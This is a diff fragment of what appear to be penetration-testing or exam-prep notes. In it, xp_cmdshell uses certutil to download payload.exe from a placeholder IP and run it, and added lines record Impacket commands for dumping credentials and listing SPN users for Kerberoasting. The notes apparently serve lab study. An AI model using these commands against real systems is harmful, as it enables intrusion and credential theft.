@@ -219,6 +219,13 @@ Foothold:
       - xp_cmdshell "certutil -urlcache -f http://<IP>/payload.exe"
       - go 
       - xp_cmdshell "payload.exe" 
+ 
+  Impacket:
+    - From Kali: impacket-secretdump <domain>/<user>@<IP>
+      - This will dump a password
+    - From Kali: impacket-GetUserSPNs exam.com/apachesvc -dc-ip <DC IP>
+      - This will get SPN users
+  
       
     
 
